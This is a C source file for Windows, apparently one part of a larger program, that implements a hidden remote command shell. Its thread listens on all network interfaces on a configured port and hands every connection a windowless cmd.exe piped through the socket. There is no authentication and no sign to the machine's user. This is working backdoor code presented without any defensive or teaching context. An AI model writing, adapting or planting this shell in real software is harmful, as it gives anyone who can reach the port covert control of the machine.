#pragma warning(push, 3)
# include <winsock2.h>
# include <ws2tcpip.h>
#pragma warning(pop)

#include "common.h"

static HANDLE g_job = NULL;

static void init_job(void)
{
	g_job = CreateJobObjectW(NULL, NULL);
	if (!g_job)
		return;

	JOBOBJECT_EXTENDED_LIMIT_INFORMATION jeli;
	ZeroMemory(&jeli, sizeof(jeli));
	jeli.BasicLimitInformation.LimitFlags = JOB_OBJECT_LIMIT_KILL_ON_JOB_CLOSE;

	SetInformationJobObject(g_job, JobObjectExtendedLimitInformation,
		&jeli, sizeof(jeli));
}

static void spawn_shell(SOCKET client)
{
	STARTUPINFOW si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	si.dwFlags = STARTF_USESTDHANDLES;
	si.hStdInput = (HANDLE)client;
	si.hStdOutput = (HANDLE)client;
	si.hStdError = (HANDLE)client;

	SetHandleInformation((HANDLE)client, HANDLE_FLAG_INHERIT, HANDLE_FLAG_INHERIT);

	wchar_t cmd[] = L"cmd.exe";

	if (!CreateProcessW(NULL, cmd, NULL, NULL, TRUE,
		CREATE_NO_WINDOW | CREATE_SUSPENDED, NULL, NULL, &si, &pi))
		return;

	if (g_job)
		AssignProcessToJobObject(g_job, pi.hProcess);

	ResumeThread(pi.hThread);

	WaitForSingleObject(pi.hProcess, INFINITE);
	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);
}

DWORD WINAPI rshell_thread(LPVOID param)
{
	(void)param;

	WSADATA wsa;

	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
		return 1;

	init_job();

	SOCKET srv = WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
	if (srv == INVALID_SOCKET) {
		WSACleanup();
		return 1;
	}

	int opt = 1;
	setsockopt(srv, SOL_SOCKET, SO_REUSEADDR, (const char*)&opt, sizeof(opt));

	struct sockaddr_in addr;
	ZeroMemory(&addr, sizeof(addr));
	addr.sin_family = AF_INET;
	addr.sin_addr.s_addr = INADDR_ANY;
	addr.sin_port = htons(RSHELL_PORT);

	if (bind(srv, (struct sockaddr*)&addr, sizeof(addr)) == SOCKET_ERROR) {
		closesocket(srv);
		WSACleanup();
		return 1;
	}

	if (listen(srv, 1) == SOCKET_ERROR) {
		closesocket(srv);
		WSACleanup();
		return 1;
	}

	for (;;) {
		struct sockaddr_in cli_addr;
		int cli_len = sizeof(cli_addr);

		SOCKET client = accept(srv, (struct sockaddr*)&cli_addr, &cli_len);
		if (client == INVALID_SOCKET)
			continue;

		spawn_shell(client);
		closesocket(client);
	}
}
